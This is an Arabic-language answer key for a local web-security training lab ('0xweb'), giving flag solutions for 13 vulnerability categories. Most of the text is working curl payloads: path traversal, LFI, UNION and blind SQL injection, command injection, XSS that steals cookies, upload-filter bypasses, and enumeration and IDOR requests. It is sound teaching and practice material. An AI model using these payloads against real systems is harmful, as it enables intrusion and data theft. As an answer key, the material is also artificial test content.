# 0xweb — Answer Key (per-level flags)

> يكشف الأعلام (spoilers). كل مستوى له علمه: `FLAG{0xweb_<فئة>_l<مستوى>}` — **39 علمًا**.
> `B=http://127.0.0.1:8000`. رمّز الحمولات (`--data-urlencode`).
> النجاح = ظهور `FLAG{...}` في الرد (أو سرقة كوكي XSS، أو أوراكل blind).

> ⚠️ **قيم الأعلام فريدة لكل نسخة** (لاحقة HMAC سرّية، مثل `FLAG{0xweb_cmdi_l1_2d6b7cc0}`).
> القيم المكتوبة تحت كأمثلة توضيحية فقط — **استخرج العلم الحقيقي من رد التطبيق** ولا يمكن تخمينه.

## 1) Directory Traversal — `/download?file=&level=`
لكل مستوى ملف هدف يتطلب تقنية ذلك المستوى:
```bash
curl "$B/download?file=../../secret.txt&level=1"          # FLAG{0xweb_traversal_l1}
curl "$B/download?file=/tmp/flag_trav_l2.txt&level=2"     # FLAG{0xweb_traversal_l2}  (مسار مطلق: ../ مرفوض)
curl "$B/download?file=....//secret3.txt&level=3"         # FLAG{0xweb_traversal_l3}  (....// يتجاوز حذف ../)
```

## 2) LFI — `/include?page=&level=`
```bash
curl "$B/include?page=lfi_notes.txt&level=1"              # FLAG{0xweb_lfi_l1}
curl "$B/include?page=/tmp/flag_lfi_l2.txt&level=2"       # FLAG{0xweb_lfi_l2}  (مطلق: .. مرفوض)
curl "$B/include?page=....//flag_lfi_l3.txt&level=3"      # FLAG{0xweb_lfi_l3}  (....// لصعود مجلد)
```

## 3) SQLi UNION — `/product?id=&level=`
جدول `secrets` فيه صف لكل مستوى (id=1/2/3). استخراج البيانات في المستوى N يفرض تقنيته:
```bash
curl -G "$B/product" --data-urlencode level=1 --data-urlencode "id=0 UNION SELECT id,name,flag,1 FROM secrets WHERE id=1"        # _l1
curl -G "$B/product" --data-urlencode level=2 --data-urlencode "id=0 UnIoN SeLeCt id,name,flag,1 FROM secrets WHERE id=2"        # _l2 (حالة مختلطة)
curl -G "$B/product" --data-urlencode level=3 --data-urlencode "id=0/**/UnIoN/**/SeLeCt/**/id,name,flag,1/**/FROM/**/secrets/**/WHERE/**/id=3"   # _l3 (/**/ بدل الفراغ)
```

## 4) SQLi Blind — `/api/lookup?id=&level=`
الهدف جدول `blind(level,flag)`. استخرج `flag` للمستوى N حرفًا حرفًا:
```bash
# L1 boolean:
curl -G "$B/api/lookup" --data-urlencode level=1 --data-urlencode "id=1 AND substr((SELECT flag FROM blind WHERE level=1),1,1)='F'"   # {"exists":true}
# L2 يحذف and/or الصغيرة → AnD:
curl -G "$B/api/lookup" --data-urlencode level=2 --data-urlencode "id=1 AnD substr((SELECT flag FROM blind WHERE level=2),1,1)='F'"
# L3 زمني (الرد ثابت status:ok) → قِس الزمن (لا يُرى في المتصفح، يُقاس):
# صحيح ≈ 0.65s ، خاطئ ≈ 0.002s. لتأخير أوضح ارفع randomblob (200M ≈ 0.65s، 20M ≈ 0.07s).
curl -o /dev/null -w '%{time_total}\n' -G "$B/api/lookup" --data-urlencode level=3 \
  --data-urlencode "id=1 AnD (SELECT CASE WHEN substr((SELECT flag FROM blind WHERE level=3),1,1)='F' THEN length(hex(randomblob(200000000))) ELSE 0 END)"
```
حلقة استخراج L1 (تعطي `FLAG{0xweb_sqli_blind_l1}`):
```bash
s=""; for i in $(seq 1 26); do for c in $(printf '%s ' F L A G { } _ 0 x w e b s q l i n d 1 2 3); do
  r=$(curl -s -G "$B/api/lookup" --data-urlencode level=1 --data-urlencode "id=1 AND substr((SELECT flag FROM blind WHERE level=1),$i,1)='$c'")
  [[ "$r" == *true* ]] && { s="$s$c"; break; }; done; done; echo "$s"
```

## 5) Command Injection — `/tools/ping?host=&level=`
ملف علم لكل مستوى؛ استخدم تقنية تجاوز المستوى:
```bash
curl -G "$B/tools/ping" --data-urlencode level=1 --data-urlencode "host=127.0.0.1;cat /tmp/flag_cmdi_l1.txt"           # _l1
curl -G "$B/tools/ping" --data-urlencode level=2 --data-urlencode 'host=127.0.0.1$(cat /tmp/flag_cmdi_l2.txt)'  # _l2 (L2 يحذف ; && & | → استبدال أوامر $() أو `backticks` أو سطر جديد، بلا ;)
curl -G "$B/tools/ping" --data-urlencode level=3 --data-urlencode $'host=127.0.0.1\ncat /tmp/flag_cmdi_l3.txt'         # _l3 (سطر جديد)
```

## 6-8) XSS — كوكي علم **لكل مستوى**
كل صفحة XSS تضبط كوكي `FLAG{0xweb_xss_<نوع>_l<المستوى>}` (غير HttpOnly). نفّذ XSS متجاوزًا فلتر المستوى ثم اسرق `document.cookie`.
```
# Reflected  /search?q=&level=
L1: <script>alert(document.cookie)</script>
L2: <img src=x onerror=alert(document.cookie)>            (يحذف <script>)
L3: "><img src=x onerror=alert(document.cookie)>          (انعكاس داخل سمة value → اكسرها)

# Stored  /comments  (level في النموذج ; كل التعليقات تظهر في كل المستويات)
L1: <script>alert(document.cookie)</script>
L2: <img src=x onerror=alert(document.cookie)>            (يحذف <script>)
L3: <svg onload=alert(document.cookie)>                   (يحذف <script> ومعالجات مقتبسة on..="..." → استخدم معالجًا غير مقتبس)

# DOM  /dom?value=&level=
L1: <img src=x onerror=alert(document.cookie)>            (innerHTML)
L2: <img src=x onerror=alert(document.cookie)>            (يحذف <script>)
L3: javascript:alert(document.cookie)                     (سِنك href → اضغط الرابط)
```

## 9) File/Dir Enumeration
```bash
# L1: robots.txt يسرّب db.sql.bak فقط
curl "$B/robots.txt"                                 # Disallow: /static/files/db.sql.bak
curl "$B/static/files/db.sql.bak"                    # FLAG{0xweb_enum_l1}
# L2: dotfile غير مُسرَّب — يُكتشف بقائمة تحوي .env (common.txt، لا raft-small):
gobuster dir -u "$B/static/files/" -w .../common.txt
curl "$B/static/files/.env"                          # FLAG{0xweb_enum_l2}
# L3: غير مذكور في robots — يُكتشف بالـ fuzzing + تمييز كود الحالة:
gobuster dir -u "$B/" -w .../raft-small-directories.txt   # server-status→200 ، admin-panel→403
curl -o /dev/null -w '%{http_code}\n' "$B/admin-panel"   # 403 (موجود) ≠ 404
curl "$B/server-status"                              # FLAG{0xweb_enum_l3}  (أو /admin-panel?token=0xweb-internal)
```

## 10) File Upload — `/upload` (الخادم يقبل "صورًا فقط")
الهدف: تهريب ملف **ينفّذ في المتصفح** (stored XSS) خلف فلتر الصور. العلم يُمنح فقط إذا كان الملف
المخزَّن بامتداد فعّال (`.html/.svg`) **وفيه محتوى فعّال حقيقي**. حمولة الاختبار:
`printf '<script>alert(document.cookie)</script>' > p.html`
```bash
# L1: الفلتر يثق بترويسة Content-Type فقط → زوّرها إلى image/*:
curl -L -F level=1 -F 'file=@p.html;type=image/png'  $B/upload   # FLAG{0xweb_upload_l1}

# L2: الفلتر يطلب امتداد صورة "داخل" الاسم (contains لا endswith) → امتداد مزدوج:
cp p.html shell.png.html
curl -L -F level=2 -F 'file=@shell.png.html'         $B/upload   # FLAG{0xweb_upload_l2}

# L3: الفلتر يقرأ بايتات البداية ويطلب توقيع صورة حقيقي → polyglot صورة/سكربت:
printf 'GIF89a<script>alert(document.cookie)</script>' > poly.html
curl -L -F level=3 -F 'file=@poly.html'              $B/upload   # FLAG{0xweb_upload_l3}
```
> افتح رابط الملف المرفوع `/static/uploads/<الاسم>` لرؤية `alert` ينفّذ (إثبات الـ stored XSS).

## 11) Parameter Enumeration — `/debug?level=`
اكتشف الاسم أولًا (رد مختلف الطول عند الاسم الصحيح)، ثم القيمة:
```bash
# اكتشاف الاسم بـ wfuzz (فلترة حجم الـ baseline بـ --hh):
wfuzz -u "$B/debug?level=1&FUZZ=1" -w burp-parameter-names.txt --hh 15
# أو arjun (يكشف تلقائيًا بالفروقات):  arjun -u "$B/debug?level=1"
# الأسماء/القيم التي تفتح العلم:
curl "$B/debug?level=1&verbose=1"                     # FLAG{0xweb_param_l1}
curl "$B/debug?level=2&debug=1"                       # FLAG{0xweb_param_l2}
curl "$B/debug?level=3&admin=true"                    # FLAG{0xweb_param_l3}
```
> ملاحظة: الاسم الصحيح بقيمة خاطئة يردّ `{"status":"ok","<param>":"recognized — value rejected"}`
> (طول مختلف → تكتشفه الأداة)، بينما المعامل المجهول يردّ `{"status":"ok"}` فقط.

## 12) Virtual Host Enumeration (ترويسة Host)
```bash
curl -s "$B/" -H "Host: dev.0xweb.local"              # FLAG{0xweb_vhost_l1}
curl -s "$B/" -H "Host: admin.0xweb.local"            # FLAG{0xweb_vhost_l2}
# L3 مخفي — يتسرّب في vhosts.conf عبر Traversal:
curl -s "$B/download?file=vhosts.conf&level=1"        # يكشف backup-2024.0xweb.local
curl -s "$B/" -H "Host: backup-2024.0xweb.local"      # FLAG{0xweb_vhost_l3}
```

## 13) IDOR
```bash
curl "$B/profile?user_id=3&level=1"                   # FLAG{0xweb_idor_l1}  (secret الخاص بـ admin)
curl "$B/api/orders?order_id=3&level=2"               # FLAG{0xweb_idor_l2}  (طلب admin بلا تحقق ملكية)
curl "$B/api/account?ref=$(printf 3|base64)&level=3"  # FLAG{0xweb_idor_l3}  (حقل token — مرجع base64)
```

## قوائم الكلمات المساعدة (Wordlists)

التحديات القائمة على الاستطلاع تحتاج القائمة **المناسبة** — اختيارها نصف الحل. القوائم من
[SecLists](https://github.com/danielmiessler/SecLists) (استنسخها بنفسك؛ ليست ضمن هذا الريبو).
المسارات أدناه نسبية لجذر SecLists.

| التحدي | القائمة المقترحة | لماذا / ملاحظة |
|---|---|---|
| **File/Dir Enum L1** | — (اقرأ `robots.txt` مباشرة) | لا تحتاج قائمة |
| **File/Dir Enum L2** (`.env`) | `Discovery/Web-Content/common.txt` | تحوي dotfiles مثل `.env` — **قوائم `raft-small` لا تحويها** |
| **File/Dir Enum L3** (`/server-status`,`/admin-panel`) | `Discovery/Web-Content/raft-small-directories.txt` | ميّز `200`/`403` عن `404` (`gobuster -b ''` أو `ffuf -mc all`) |
| **Parameter Enum** (`verbose`,`debug`,`admin`) | `Discovery/Web-Content/burp-parameter-names.txt` | أو `arjun` بقائمته المدمجة؛ **افلتر حجم الـ baseline** (`wfuzz --hh`) |
| **Virtual Host Enum** | قائمة FQDN كاملة (`dev.0xweb.local` …) | ضد IP: **لا** تستعمل `--append-domain`؛ أو `ffuf -H "Host: FUZZ.0xweb.local"` |
| **LFI** (تحميل ملفات النظام) | `Fuzzing/LFI/LFI-Jhaddix.txt` | لاكتشاف مسارات LFI الشائعة (بعد فهم آلية التجاوز) |
| **File Upload** | — (لا قائمة) | التقنية يدوية: MIME spoof / امتداد مزدوج / polyglot |

**قواعد ذهبية:**
- **الفلترة إلزامية:** بدون إخفاء الـ baseline (`--hh`/`-fs`/`-b`) كل الردود تبدو متطابقة فتظنّ "لا شيء".
- **القائمة الصغيرة تفوّت الكثير:** إن فشلت `common`/`raft-small`، صعّد إلى `raft-medium`/`raft-large`.
- **dotfiles وملفات النسخ:** أضف امتدادات (`-x env,bak,old,sql,zip`) لاكتشاف `.env`/`db.sql.bak`.

## سلّم الأعلام في /submit
كل الأعلام صيغتها `FLAG{0xweb_<فئة>_l<1|2|3>}`. الفئات: traversal, lfi, sqli_union, sqli_blind,
cmdi, xss_reflected, xss_stored, xss_dom, enum, upload, param, vhost, idor. المجموع 39.
